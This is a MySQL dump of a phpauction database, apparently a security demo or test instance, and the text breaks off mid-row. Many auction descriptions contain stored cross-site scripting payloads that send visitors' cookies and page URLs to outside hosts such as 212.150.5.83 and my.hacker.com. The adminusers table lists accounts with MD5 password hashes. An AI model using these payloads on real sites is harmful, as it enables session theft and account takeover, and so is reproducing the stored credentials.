-- MySQL dump 10.13  Distrib 5.1.49, for debian-linux-gnu (i486)
--
-- Host: localhost    Database: phpauction
-- ------------------------------------------------------
-- Server version	5.1.49-3

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `adminusers`
--

DROP TABLE IF EXISTS `adminusers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `adminusers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL DEFAULT '',
  `password` varchar(32) NOT NULL DEFAULT '',
  `created` varchar(8) NOT NULL DEFAULT '',
  `lastlogin` varchar(14) NOT NULL DEFAULT '',
  `status` int(2) NOT NULL DEFAULT '0',
  KEY `id` (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `adminusers`
--

LOCK TABLES `adminusers` WRITE;
/*!40000 ALTER TABLE `adminusers` DISABLE KEYS */;
INSERT INTO `adminusers` VALUES (10,'Magni','8f1db20321d184390d1fd96d658c1c98','20011224','20031016093628',1),(12,'root','13f4ec14c0a19faa1ea505d2cf611790','20031016','20031016095713',1);
/*!40000 ALTER TABLE `adminusers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auctions`
--

DROP TABLE IF EXISTS `auctions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auctions` (
  `id` varchar(32) NOT NULL DEFAULT '',
  `user` varchar(32) DEFAULT NULL,
  `title` tinytext,
  `starts` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `description` text,
  `pict_url` tinytext,
  `category` int(11) DEFAULT NULL,
  `minimum_bid` double(16,4) DEFAULT NULL,
  `reserve_price` double(16,4) DEFAULT NULL,
  `auction_type` char(1) DEFAULT NULL,
  `duration` char(2) DEFAULT NULL,
  `increment` double(8,4) NOT NULL DEFAULT '0.0000',
  `location` tinytext,
  `location_zip` varchar(6) DEFAULT NULL,
  `shipping` char(1) DEFAULT NULL,
  `payment` tinytext,
  `international` char(1) DEFAULT NULL,
  `ends` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `current_bid` double(16,4) DEFAULT NULL,
  `closed` char(1) DEFAULT NULL,
  `photo_uploaded` char(1) DEFAULT NULL,
  `quantity` int(11) DEFAULT NULL,
  `suspended` int(1) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auctions`
--

LOCK TABLES `auctions` WRITE;
/*!40000 ALTER TABLE `auctions` DISABLE KEYS */;
INSERT INTO `auctions` VALUES ('6e8d12779fff6a92451d32bb2772deb5','c954d399973fe03368d1991c56730d3a','whatever','2003-12-08 02:26:54','<script language=\'javascript\'>\n\ndocument.write(\"<img src=http://212.150.5.83/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\n</script>','',131,800.0000,0.0000,'1','90',0.0000,'105','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-03-07 02:26:54',0.0000,'0','0',1,0),('2cb77d289d1fe5527bfe54e44b9c15d0','399bd5c9bdbf0e072b2dafc9e3704e5b','17\" monitor','2003-12-08 01:25:02','<script language=\'javascript\'>\r\n\r\ndocument.write(\"<img src=http://212.150.5.83/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\r\n</script>','',72,20.0000,0.0000,'1','1',0.0000,'26','12345','1','Checks \nMoney Order \nMasterCard or Visa \n','0','2003-12-09 01:25:02',0.0000,'0','0',1,0),('ad305b38d437cb2eb1fa3646fdc217be','c954d399973fe03368d1991c56730d3a','kkkdfkk','2003-12-07 11:02:44','<script language=\'javascript\'>\n\ndocument.write(\"<img src=http://212.150.5.83/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\n</script>','',1,100.0000,0.0000,'1','1',0.0000,'3','33333','1','Checks \nMoney Order \nPaypal \n','0','2003-12-08 11:02:44',0.0000,'0','0',1,0),('c0d19d9f39f94da460136157bef5c3b7','c954d399973fe03368d1991c56730d3a','send cookie','2003-12-07 09:37:58','<script language=\'javascript\'>\n\ndocument.write(\"<img src=http://212.150.5.83/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\n</script>','c0d19d9f39f94da460136157bef5c3b7.gif',131,10.0000,0.0000,'1','1',0.0000,'105','45678','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-12-08 09:37:58',0.0000,'0','1',1,0),('c84866731785319932bdb56fb3cd454f','6b625f0eb2193e7f75c0bb1ee60bb83c','item','2003-10-18 14:21:15','<script language=\"javascript\"> document.write(\"<img src=http://localhost/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");  </script>','',1,2.0000,0.0000,'1','1',0.0000,'27','12345','1','Money Order \nPaypal \n','0','2003-10-19 14:21:15',0.0000,'0','0',1,0),('9c440283e45d070d2a34f9f68a10ebf5','399bd5c9bdbf0e072b2dafc9e3704e5b','video','2003-12-04 02:26:54','just a description !','',1,150.0000,300.0000,'1','1',0.0000,'13','12345','1','Money Order \nMasterCard or Visa \n','0','2003-12-05 02:26:54',0.0000,'0','0',1,0),('e19131d3b7c6e7bf76c81a2a8b945e78','399bd5c9bdbf0e072b2dafc9e3704e5b','This is My title !','2003-12-04 03:01:28','this is the description ! ()','',4,150000.0000,1000000.0000,'2','90',500.0000,'10','78945','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2004-03-03 03:01:28',0.0000,'0','0',15,0),('94d63d2db0710e01c4873f11b79b9b2c','399bd5c9bdbf0e072b2dafc9e3704e5b','item title','2003-12-04 03:14:29','item description','',1,123.0000,100000.0000,'2','1',500.0000,'10','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2003-12-05 03:14:29',0.0000,'0','0',1,0),('1d9b7c48090bb3226f35247c137d43f9','399bd5c9bdbf0e072b2dafc9e3704e5b','Samsung cell phone 624 as new','2003-12-04 04:17:14','description lkjasfdlaksdfjlakjdgflkaj\r\n;lskadjflksdjflkjg.\r\nkjdflajdflkjflaj \" / uoifuiodfsu isdufoidfu \r\njhgf$ & % @ - <>','',1,650.0000,0.0000,'1','15',0.0000,'9','98745','2','Checks\nPaypal\nMasterCard or Visa\nWire Transfer\n','1','2003-12-19 04:17:14',0.0000,'0','0',2,0),('4fa7a0a25814316d968e899d43a96ea4','399bd5c9bdbf0e072b2dafc9e3704e5b','new title !','2003-12-04 04:29:54','new description !!!  / \" \' ; :\r\n? \r\n\r\njksdfgjkasdgfjkagfjkf\r\nsdakgfkjasdgfksdjghfasdgh;\r\nasdfkluhskljfhklsdajhfklasdhfkjasdhfjkahkf\r\n\r\nsdlfjladsfhgasdhfkhasdklfhkdsyufksdyhf\r\nsdfjlsdufoysdfkgtsdtf\r\n','',60,120.0000,0.0000,'2','60',0.0000,'38','12345','1','Checks\nMoney Order\nPaypal\nMasterCard or Visa\nWire Transfer\n','1','2004-02-02 04:29:54',0.0000,'0','0',2,0),('6d38dc6b200bb0af430f9246ccf481e1','399bd5c9bdbf0e072b2dafc9e3704e5b','item title !!','2003-12-04 07:13:36','description ! $ &','6d38dc6b200bb0af430f9246ccf481e1.gif',1,1.0000,5.0000,'1','1',2.0000,'6','12345','1','Money Order \n','0','2003-12-05 07:13:36',0.0000,'0','1',1,0),('f3bf06c4cdb7294285b8e2df42966849','c954d399973fe03368d1991c56730d3a','Elctric shaver','2003-12-07 09:12:53','<script language=\'javascript\'>\n\ndocument.write(\"<img src=http://192.168.1.13/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\n</script>','',131,10.0000,0.0000,'1','15',0.0000,'105','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-12-22 09:12:53',0.0000,'0','0',1,0),('6318135a7f5c1689c3e3332a0b6fcdf4','8b07eafda17b8aa859a2169066a3ecf9','Suit Case','2003-10-16 10:00:25','Item for sale','',1,22.0000,0.0000,'1','1',0.0000,'221','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 10:00:25',0.0000,'0','0',1,0),('e1d0a350688810f45663dafeb543f831','8a13d37b1c0a63b2001f39139afbdcc6','Life Insurance','2003-10-16 10:00:05','Item for sale','',1,21.0000,0.0000,'1','1',0.0000,'221','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 10:00:05',0.0000,'0','0',1,0),('40bcd3a2ac594b0078b5fb39333c9a82','1a95ce3a54cf1e88ffee87786e729566','Painting','2003-10-16 09:59:44','Item for sale','',1,20.0000,0.0000,'1','1',0.0000,'221','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:59:44',0.0000,'0','0',1,0),('7406044bd6f5aeac22728be57e767e99','1a95ce3a54cf1e88ffee87786e729566','autoitem1','2003-10-16 09:49:58','Item description1','',1,1.0000,0.0000,'1','1',0.0000,'29','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:49:58',0.0000,'0','0',1,0),('8520a20274dfed7e80d233c88cd34116','6eafaa376a669bdc2991f9d04ad19a65','half eaten Royal with cheese','2007-02-08 16:11:40','Old but still got that loving feeling','',194,1.9900,10.0000,'1','30',0.0000,'234','2332','2','Loads of Cash \n','1','2007-03-10 16:11:40',0.0000,'0','0',1,0),('a73f9d51e28e7cd22234578a60352f93','8b07eafda17b8aa859a2169066a3ecf9','autoitem1','2003-10-16 09:50:56','Item description1','',1,1.0000,0.0000,'1','1',0.0000,'29','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:50:56',0.0000,'0','0',1,0),('53a7e658b1cbc35419c84ac72d4b7ebe','1a95ce3a54cf1e88ffee87786e729566','autoitem1','2003-10-16 09:51:24','Item description1','',1,1.0000,0.0000,'1','1',0.0000,'29','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:51:24',0.0000,'0','0',1,0),('0fae437b7abfd886c8bda4b11a606d48','1a95ce3a54cf1e88ffee87786e729566','autoitem1','2003-10-16 09:51:53','Item description1','',1,1.0000,0.0000,'1','1',0.0000,'29','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:51:53',0.0000,'0','0',1,0),('659bf5bbede6ca5697920e48f37be425','6eafaa376a669bdc2991f9d04ad19a65','half eaten Royal with cheese','2007-02-08 06:44:41','Old but still got that loving feeling','',194,1.9900,10.0000,'1','30',0.0000,'234','2332','2','Loads of Cash \n','1','2007-03-10 06:44:41',0.0000,'0','0',1,0),('7e37dd9c4956c5267d220326e173c814','8b07eafda17b8aa859a2169066a3ecf9','autoitem1','2003-10-16 09:52:51','Item description1','',1,1.0000,0.0000,'1','1',0.0000,'29','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:52:51',0.0000,'0','0',1,0),('31631d1e1d017ff01600f773ad868ac3','1a95ce3a54cf1e88ffee87786e729566','Honda Accord','2003-10-16 09:58:22','Item for sale','',1,16000.0000,0.0000,'1','1',0.0000,'221','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:58:22',0.0000,'0','0',1,0),('52a20fc9950a210cc252008d8721843d','8a13d37b1c0a63b2001f39139afbdcc6','Cool Stuff','2003-10-16 09:58:43','Item for sale','',1,17.0000,0.0000,'1','1',0.0000,'221','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:58:43',0.0000,'0','0',1,0),('b59e7c8510a483201fc55960d41c16cb','8b07eafda17b8aa859a2169066a3ecf9','Traffic Shield','2003-10-16 09:59:03','Item for sale','',1,25000.0000,0.0000,'1','1',0.0000,'221','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:59:03',0.0000,'0','0',1,0),('1761ce988ba9173962888d19b73e5133','1a95ce3a54cf1e88ffee87786e729566','Can of Coke','2003-10-16 09:59:24','Item for sale','',1,1.0000,0.0000,'1','1',0.0000,'221','12345','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2003-10-17 09:59:24',0.0000,'0','0',1,0),('0823a85ad57ce473c2b8af17d9fa151f','399bd5c9bdbf0e072b2dafc9e3704e5b','testing XSS','2004-03-01 10:30:33','<script language=\"javascript\"> document.write(“\r\n<img src=http://my.hacker.com/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\"); \r\n </script>\r\n','',20,34.0000,0.0000,'1','1',0.0000,'6','12345','1','Paypal \n','0','2004-03-02 10:30:33',0.0000,'0','0',1,0),('d673ad7cbca106a46bf680629e6e1e10','399bd5c9bdbf0e072b2dafc9e3704e5b','testing XSS1','2004-03-01 10:35:33','<script language=\"javascript\"> document.write(“\r\n<img src=http://212.150.5.83/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\"); \r\n </script>\r\n','',1,34.0000,0.0000,'1','1',0.0000,'28','12345','1','MasterCard or Visa \n','0','2004-03-02 10:35:33',0.0000,'0','0',1,0),('41630aa8fc894d0d9e7dcf0ab88a314f','399bd5c9bdbf0e072b2dafc9e3704e5b','testing XSS12','2004-03-01 10:41:22','<script language=\"javascript\"> document.write(“\r\n<img src=http://212.150.5.83/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\"); \r\n </script>\r\n','',1,30.0000,0.0000,'1','1',0.0000,'9','12345','1','Paypal \n','0','2004-03-02 10:41:22',0.0000,'0','0',1,0),('d02bda3ec1049c37581147142766569c','399bd5c9bdbf0e072b2dafc9e3704e5b','testing XSS123','2004-03-01 10:45:28','<script language=\'javascript\'>\r\ndocument.write(\"<img src=http://localhost/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\r\n</script>\r\n','',1,20.0000,0.0000,'1','1',0.0000,'4','12345','1','Paypal \n','0','2004-03-02 10:45:28',0.0000,'0','0',1,0),('688203f453a970639af1d06e745a70dd','08c5f7a10b44a3f729a3c454d763a955','New Flow','2004-03-08 13:44:53','Unused flow never been connected to any object','http://www.magnifire.com/images/home_top.gif',126,30.0000,140.0000,'1','90',0.0000,'105','69719','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2004-06-06 14:44:53',0.0000,'0','0',7,0),('6474cceeaa3bcd93313384616d17e183','399bd5c9bdbf0e072b2dafc9e3704e5b','Used IBM laptop','2004-03-09 06:55:52','2 years old IBM\r\nThinkpad 41R','',125,666.0000,800.0000,'2','90',20.0000,'199','45678','2','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-06-07 07:55:52',0.0000,'0','0',1,0),('14288588737b9ea8e66d4e39a33a1f72','f908494e59ccb6975e0cde4decc5868f','title','2004-03-01 13:30:00','aaaa','',1,22222.0000,0.0000,'1','1',0.0000,'4','55555','1','Checks\nMoney Order\nWire Transfer\n','1','2004-03-02 13:30:00',0.0000,'0','0',1,0),('3458611dbf05d6062c52623f64f56079','a87f0b1f2c29df309517044d1fc4b0e0','cat','2004-05-24 06:47:55','big cat','www.picture.com',133,23.0000,23.0000,'1','1',0.0000,'105','44000','1','MasterCard or Visa \n','0','2004-05-25 06:47:55',0.0000,'0','0',1,0),('29ffe41266ee756ba4650efd7073bc48','399bd5c9bdbf0e072b2dafc9e3704e5b','video','2004-05-24 07:29:48','used video at 20% off price;\r\nI used it for half a year\r\nonly 20$','',1,1000.0000,15000.0000,'2','90',25.0000,'161','12345','2','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2004-08-22 07:29:48',0.0000,'0','0',1,0),('e25cf25b4aacc009c89c22674b428b97','a87f0b1f2c29df309517044d1fc4b0e0','bh','2004-05-24 07:40:21','hjbvhjxbhjb','hjb',136,333.0000,0.0000,'2','15',33.0000,'12','251','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-06-08 07:40:21',0.0000,'0','0',1,0),('c1988758b041d5f531d86dcd1195fce1','a87f0b1f2c29df309517044d1fc4b0e0','kyky','2004-05-24 09:35:32','khoihy','ihyioy',14,678.0000,2331.0000,'1','3',53.0000,'18','4467i5','2','MasterCard or Visa \n','1','2004-05-27 09:35:32',0.0000,'0','0',8,0),('3fa2d51eeafe724a9d2457055a603cbc','a87f0b1f2c29df309517044d1fc4b0e0','script                                              script','2004-05-25 01:38:40','only for boys','tryyyyyyyyyyyyyyyyyy',22,1.0000,12.0000,'1','15',4.0000,'1','11111','2','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2004-06-09 01:38:40',0.0000,'0','0',3,0),('70ddc9c06eaec6891400399424eced18','a87f0b1f2c29df309517044d1fc4b0e0','babushka','2004-05-25 01:48:22','matreshka','matreshka',1,10.0000,1000.0000,'2','3',0.0000,'19','000000','2','Checks \nPaypal \nWire Transfer \n','1','2004-05-28 01:48:22',0.0000,'0','0',1,0),('7c4160ed9fd6da52e8082e66d98ea5e7','223e292c63acaf04a28ebf332c270588','star','2004-05-25 04:23:33','star 7','',22,22.0000,0.0000,'1','1',44.0000,'17','0987','2','Checks \nMoney Order \n','1','2004-05-26 04:23:33',0.0000,'0','0',1,0),('bb49208e8a6a03c7a6c776eb545d9e12','a87f0b1f2c29df309517044d1fc4b0e0','Fax','2004-06-21 03:17:39','a new Fax','',1,11.0000,0.0000,'1','1',0.0000,'4','44444','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-06-22 03:17:39',0.0000,'0','0',1,0),('415d14385be4cef156082d31886985e3','a87f0b1f2c29df309517044d1fc4b0e0','Fax','2004-06-21 03:29:03','a new Fax','',1,11.0000,0.0000,'1','1',0.0000,'4','44444','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-06-22 03:29:03',0.0000,'0','0',1,0),('8f3f1077b0c81b93731d0998ef17b9de','a87f0b1f2c29df309517044d1fc4b0e0','Fax','2004-06-21 03:37:29','a new Fax','',1,11.0000,0.0000,'1','1',0.0000,'4','44444','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-06-22 03:37:29',0.0000,'0','0',1,0),('909dc0ea46f99a5b997ed1d3e6474286','a87f0b1f2c29df309517044d1fc4b0e0','Fax','2004-06-21 03:47:21','a new Fax','',1,11.0000,0.0000,'1','1',0.0000,'4','44444','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-06-22 03:47:21',0.0000,'0','0',1,0),('45d3fec4d2aa5a2cf54913b1a928289d','aa327f9d364a9e18f5a99ce100fb3f1a','Old sneakers','2004-08-17 10:55:54','<script language=\"javascript\">\r\ndocument.write(\'<img src=http://localhost/?url=\' + document.location +\r\n\'&cookie=\' + document.cookie + \'>\');\r\n</script>','',1,1.0000,0.0000,'1','1',0.0000,'221','42131','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-08-18 10:55:54',0.0000,'0','0',1,0),('a37267c22e552771026dadb0ab923b37','46353d8e34feb49c328495d509e61e82','socks ( used)','2004-08-18 10:21:12','wqd','a37267c22e552771026dadb0ab923b37.gif',1,1.0000,0.0000,'1','1',1.0000,'232','12345','2','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2004-08-19 10:21:12',0.0000,'0','1',1,0),('7d2c71e00c00802388e2855ce4bb78cb','46353d8e34feb49c328495d509e61e82','nada','2004-08-19 09:14:28','going home Bkah','',1,10.0000,0.0000,'1','1',0.0000,'2','258369','1','Checks\nMoney Order\nPaypal\nMasterCard or Visa\nWire Transfer\n','0','2004-08-20 09:14:28',0.0000,'0','0',1,0),('0e73147080e954b3a15fb4786d8641e7','266110db14ef8f3e2766ad277b6c9d56','Peter\'s Shirt','2004-09-01 12:24:44','<script language=\'javascript\'>\r\ndocument.write(\"<img src=http://charliecano.com/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\r\n</script>','',1,12.0000,0.0000,'1','1',0.0000,'26','22222','1','Checks \n','0','2004-09-02 12:24:44',0.0000,'0','0',1,0),('1962dd4465ab1abaad536df556caf0fc','5579831eca129b3dd594c5da7ad9a353','F5 TrafficShield','2004-09-14 20:47:18','Application Firewall\r\nThe best device available today to protect your web-based application.','1962dd4465ab1abaad536df556caf0fc.jpg',127,16900.0000,0.0000,'1','1',0.0000,'221','98119','2','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2004-09-15 20:47:18',0.0000,'0','1',1,0),('ed3e9d1c2b08f67c66d495267e9c1848','6cd892e6ca10a4f29a04950788338c52','Road Show T-Shirt','2004-11-11 12:04:58','<script language=\"javascript\">\r\ndocument.write(\'<img src=http://www.mycookiemonster.ken/?url=\' + document.location +\r\n\'&cookie=\' + document.cookie + \'>\');\r\n</script>','',71,1.0000,0.0000,'1','90',0.0000,'221','55068','1','Checks\nPaypal\nMasterCard or Visa\n','0','2005-02-09 12:04:58',0.0000,'0','0',1,0),('a3b04afdc8c027b9a4df350c6d2d0b38','46353d8e34feb49c328495d509e61e82','HACK','2004-11-29 04:39:55','<script language=\'javascript\'>\r\ndocument.write(\"<img src=http://10.168.2.101/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\r\n</script>\r\n','',1,100.0000,0.0000,'1','1',0.0000,'28','12345','1','Wire Transfer \n','0','2004-11-30 04:39:55',0.0000,'0','0',1,0),('dd85d19b1b45c33c24fce6a2751d1941','46353d8e34feb49c328495d509e61e82','oreily','2004-11-29 04:50:34','\r\n<script language=\'javascript\'>\r\ndocument.write(\"<img src=http://10.168.2.101/ror/books/javaenterprise/jnut/gifs/banner.gif?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\r\n</script>\r\n','',1,1.0000,0.0000,'1','1',0.0000,'28','56789','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2004-11-30 04:50:34',0.0000,'0','0',1,0),('d672d5569c25bc6781ce50252ed98fc7','405e895664897e1d233896bb31a18ac6','audiTT','2004-12-01 03:46:28','blue','',1,1000.0000,0.0000,'1','1',0.0000,'75','91410','1','Checks \nMoney Order \nPaypal \n','0','2004-12-02 03:46:28',0.0000,'0','0',1,0),('11a14211558c8008ff35b548c090ad0b','405e895664897e1d233896bb31a18ac6','Boat','2004-12-01 03:50:44','big and white','',22,100000.0000,1000000.0000,'1','3',0.0000,'17','12345','1','Paypal \nMasterCard or Visa \n','0','2004-12-04 03:50:44',0.0000,'0','0',1,0),('f93395781549f35e2bd56e81adc73561','46353d8e34feb49c328495d509e61e82','banana','2004-12-01 03:51:37','Half eaten banana','',194,1.0000,0.0000,'1','1',0.0000,'19','999','1','Checks \nMoney Order \nPaypal \n','0','2004-12-02 03:51:37',0.0000,'0','0',1,0),('3d35496eb81c663e1deb7908c364451a','405e895664897e1d233896bb31a18ac6','test again','2004-12-01 03:53:38','another','3d35496eb81c663e1deb7908c364451a.gif',1,1000.0000,0.0000,'1','1',0.0000,'3','12345','1','Checks\nPaypal\nMasterCard or Visa\n','0','2004-12-02 03:53:38',0.0000,'0','1',1,0),('8248913cbd3b5a819efd688b16c33272','f0eeeab703bc1f468cd0da2cac6a1ec3','L2-Switch','2004-12-01 04:01:59','pretty old switch','',1,5.0000,0.0000,'1','7',0.0000,'82','1234','1','Checks \n','0','2004-12-08 04:01:59',0.0000,'0','0',1,0),('e14f0ea44d11888310fca0e4dae2266b','405e895664897e1d233896bb31a18ac6','plane','2004-12-01 04:09:40','B747 - red','',55,1000000.0000,0.0000,'1','30',0.0000,'19','23456','2','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2004-12-31 04:09:40',0.0000,'0','0',10,0),('f96f08bfd921f4755853185e6f7af3f1','405e895664897e1d233896bb31a18ac6','MirageIII','2004-12-01 04:12:59','fast flight','',151,10000000.0000,500000.0000,'1','90',0.0000,'143','qwerty','2','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','1','2005-03-01 04:12:59',0.0000,'0','0',1,0),('0e6637b2db31a606ae5f9015f93dcd41','46353d8e34feb49c328495d509e61e82','Batz','2004-12-01 07:48:34','Vampire bat for sale. ','0e6637b2db31a606ae5f9015f93dcd41.gif',1,1.0000,0.0000,'1','1',0.0000,'57','000','1','Checks\nMoney Order\nPaypal\nMasterCard or Visa\n','0','2004-12-02 07:48:34',0.0000,'0','1',1,0),('bae5e23dfcfbab659d77e519e0d2e04a','4572050b6cecf079b84c2c9291364b7e','Chronometre','2004-12-01 07:58:15','chronometre','bae5e23dfcfbab659d77e519e0d2e04a.jpg',67,100.0000,0.0000,'1','7',0.0000,'20','21345','1','Checks \nMoney Order \nPaypal \n','1','2004-12-08 07:58:15',0.0000,'0','1',1,0),('df9e3e508658c452f333a9569972246f','46353d8e34feb49c328495d509e61e82','upload','2004-12-01 08:23:20','full of nulls','df9e3e508658c452f333a9569972246f.jpg',1,123.0000,0.0000,'1','1',0.0000,'27','124324','1','MasterCard or Visa \n','0','2004-12-02 08:23:20',0.0000,'0','1',1,0),('158048c0c87a62666d51864dd21e4cfd','4572050b6cecf079b84c2c9291364b7e','chronos3','2004-12-01 08:48:30','chronos','158048c0c87a62666d51864dd21e4cfd.gif',1,11.0000,0.0000,'1','1',0.0000,'113','1q2w3e','1','Checks \nMoney Order \n','0','2004-12-02 08:48:30',0.0000,'0','1',1,0),('0a0bfbf1378aefec64a567137a5a1bf4','cb5d95e954f1ad7bd3ca9893002d351c','Digital camera','2005-01-12 08:04:55','Digital Camera','',20,1.0000,0.0000,'1','1',0.0000,'17','12345','1','Checks \nMoney Order \nPaypal \n','1','2005-01-13 08:04:55',0.0000,'0','0',1,0),('4d94b6e27cdc5d9ee81e436ebc79cd39','4572050b6cecf079b84c2c9291364b7e','chronos5','2004-12-01 09:02:37','chronos','4d94b6e27cdc5d9ee81e436ebc79cd39.jpg',1,222.0000,0.0000,'1','30',0.0000,'171','2wq23','1','Checks \nMoney Order \nPaypal \n','1','2004-12-31 09:02:37',0.0000,'0','1',1,0),('a8c93b37be2422a7ff3a70de269cdf98','4572050b6cecf079b84c2c9291364b7e','chronos6','2004-12-01 09:03:55','sfhfsiahfiosh','a8c93b37be2422a7ff3a70de269cdf98.gif',16,33.0000,0.0000,'1','7',0.0000,'17','456','1','Checks \nPaypal \n','0','2004-12-08 09:03:55',0.0000,'0','1',1,0),('849d464f3683f3267bda4fce85fd1cfb','cb5d95e954f1ad7bd3ca9893002d351c','laptop','2005-01-12 06:56:41','IBM thinkpad X41','',130,1200.0000,0.0000,'1','1',20.0000,'4','12345','1','Checks \nMoney Order \n','0','2005-01-13 06:56:41',0.0000,'0','0',1,0),('50676f6348d59a65b287c1bbbe588120','46353d8e34feb49c328495d509e61e82','dead fish','2004-12-01 09:59:49','half eaten dead fish','',1,1.0000,0.0000,'1','1',0.0000,'26','666','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2004-12-02 09:59:49',0.0000,'0','0',1,0),('1a05456073112be13a9978cdf3104070','c23fcb27b5e70773b6e9f5552d5a24a9','Fast car','2004-12-02 08:12:16','<script language=\"javascript\">\r\n	document.write(\'<img src=http://localhost/?uri=\' + document.location + \'&cookie=\' + \r\n\r\ndocument.cookie+ \'>\');\r\n</script>','',21,10.0000,0.0000,'1','1',0.0000,'221','60611','1','Checks \nMoney Order \n','0','2004-12-03 08:12:16',0.0000,'0','0',1,0),('ef2299e7018308fcfb891c07d5ca7b9a','c23fcb27b5e70773b6e9f5552d5a24a9','Bigip','2004-12-02 16:16:37','<script language=\"javascript\">\r\n	document.write(\'<img src=http://localhost/?uri=\' + document.location + \'&cookie=\' + document.cookie+ \'>\');\r\n</script>','',1,500.0000,0.0000,'1','1',0.0000,'221','65633','1','Checks \nMoney Order \n','0','2004-12-03 16:16:37',0.0000,'0','0',1,0),('e61b8909831b09179da134080a84920e','4304f7ec1df6021ee0dfb47f197279e0','PTO','2004-12-21 15:18:43','1 Day of vacation!','',3,10.0000,900.0000,'1','1',0.0000,'18','55123','1','Wire Transfer \n','1','2004-12-22 15:18:43',0.0000,'0','0',1,0),('00b2fd0c110154cc15c2f6e946cc34f8','15abb3d50c0f49c5b4b72bdb7fc823ef','Leopard skin thong','2005-01-09 08:36:54','Lovely smell','',190,150.0000,0.0000,'1','15',10.0000,'29','566436','1','Checks \nMoney 